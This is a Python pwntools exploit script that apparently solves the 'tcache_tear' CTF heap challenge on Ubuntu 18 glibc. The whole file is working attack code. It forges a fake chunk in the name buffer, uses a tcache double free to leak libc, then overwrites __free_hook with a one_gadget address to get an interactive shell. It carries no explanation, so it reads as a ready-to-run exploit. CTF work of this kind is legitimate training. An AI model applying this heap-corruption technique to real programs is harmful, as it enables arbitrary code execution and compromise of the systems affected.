# Ubuntu18
from pwn import *

r = process("./tcache_tear")
l = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
name = 0x602060

def add (size, data):
    r.sendafter("ice :", str(1))
    r.sendafter(":", str(size))
    r.sendafter(":", data)

def free ():
    r.sendafter("ice :", str(2))

def info ():
    r.sendafter("ice :", str(3))

r.sendafter("Name:", p64(0) + p64(0x511))

# Fake Chunk
add(0x8, "a")
free()
free()
add(0x8, p64(name))
add(0x8, 'a')
payload = p64(0) + p64(0x511) + p64(0) * 3 + p64(name+0x10)
add(0x8, payload.ljust(0x510, b'\0') + p64(0x0) + p64(0x21) + p64(0x0) * 3 + p64(0x21))
pause()
# Leak
free()
info()
r.recvuntil("ame :")
r.recv(0x10)
l.address = u64(r.recv(0x6) + b'\0\0') - 0x3ebca0
success('libc => %s' % hex(l.address))

# double free
add(0x30, "a")
free()
free()

# one_gadget
add(0x30, p64(l.sym.__free_hook))
add(0x30, 'a')
add(0x30, p64(l.address + 0x4f322))

r.interactive()
